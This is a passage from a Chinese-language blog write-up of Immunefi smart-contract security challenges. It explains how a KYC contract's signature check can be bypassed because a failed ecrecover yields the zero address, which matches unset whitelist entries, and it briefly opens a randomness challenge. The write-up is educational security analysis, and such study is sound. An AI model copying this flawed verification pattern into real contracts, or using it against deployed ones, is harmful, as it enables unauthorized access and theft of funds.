true;</span><br><span class="line">    &#125;</span><br><span class="line">function _checkWhitelisted(</span><br><span class="line">        address _tokenAddr,</span><br><span class="line">        bytes32 _messageHash,</span><br><span class="line">        bytes memory _signature</span><br><span class="line">    ) internal view &#123;</span><br><span class="line">        (bool status, address signer) &#x3D; recoverSigner(_messageHash, _signature);</span><br><span class="line">        if (signer &#x3D;&#x3D; address(0) &amp;&amp; !status) &#123;</span><br><span class="line">            revert(&quot;KYC: signature is malformed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        require(signer &#x3D;&#x3D; whitelistedOwners[_tokenAddr], &quot;KYC: only owner can onboard&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> function recoverSigner(bytes32 hash, bytes memory signature) internal pure returns (bool, address) &#123;</span><br><span class="line">        if (signature.length &#x3D;&#x3D; 65) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line"></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r :&#x3D; mload(add(signature, 0x20))</span><br><span class="line">                s :&#x3D; mload(add(signature, 0x40))</span><br><span class="line">                v :&#x3D; byte(0, mload(add(signature, 0x60)))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            address recovered &#x3D; ecrecover(hash, v, r, s);</span><br><span class="line">            return (true, recovered);</span><br><span class="line">        &#125; else if (signature.length &#x3D;&#x3D; 64) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 vs;</span><br><span class="line"></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r :&#x3D; mload(add(signature, 0x20))</span><br><span class="line">                vs :&#x3D; mload(add(signature, 0x40))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            bytes32 s &#x3D; vs &amp; bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);</span><br><span class="line">            uint8 v &#x3D; uint8((uint256(vs) &gt;&gt; 255) + 27);</span><br><span class="line"></span><br><span class="line">            address recovered &#x3D; ecrecover(hash, v, r, s);</span><br><span class="line">            return (true, recovered);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return (false, address(0));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>onboardWithSig-&gt; _checkWhitelisted-&gt;recoverSigner，最致命的在这里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address recovered &#x3D; ecrecover(hash, v, r, s);</span><br><span class="line">return (true, recovered);</span><br></pre></td></tr></table></figure>
+<p>ecrecover函数校验失败会返回一个空地址即零地址，但是其返回true，就使得我们可以通过以下的判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (signer &#x3D;&#x3D; address(0) &amp;&amp; !status) &#123;</span><br><span class="line">            revert(&quot;KYC: signature is malformed&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function applyFor(address tokenAddr) external &#123;</span><br><span class="line">        require(tokenAddr !&#x3D; address(0), &quot;KYC: token address must not be empty&quot;);</span><br><span class="line">        require(IKYCApp(tokenAddr).owner() &#x3D;&#x3D; msg.sender, &quot;KYC: only owner of token can apply&quot;);</span><br><span class="line">        whitelistedOwners[tokenAddr] &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">require(signer &#x3D;&#x3D; whitelistedOwners[_tokenAddr], &quot;KYC: only owner can onboard&quot;);</span><br></pre></td></tr></table></figure>
+<p>当某一个IKYCApp未主动调用applyFor函数时，whitelistedOwners[_tokenAddr]==0x0，由于此时的signer也等于0x0，所以我们可以通过判断。换句话说，whitelistedOwners[_tokenAddr]最初默认zero地址为白名单，存在隐患。</p>
+<h1 id="挑战七"><a href="#挑战七" class="headerlink" title="挑战七"></a>挑战七</h1><p>随机数问题<br><strong>RareNFT</strong> contract allow users to  call the mint function with send 1 ETH to mint a NFT</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Zpano
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://zpano.cn/2022/03/29/38/" title="Immunefi-community-challenges">https://zpano.cn/2022/03/29/38/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag"># 智能合约安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/29/37/" rel="prev" title="Damn-vulnerable-defi Writeup">
+                  <i class="fa fa-chevron-left"></i> Damn-vulnerable-defi Writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zpano</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">222k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:22</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+      <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
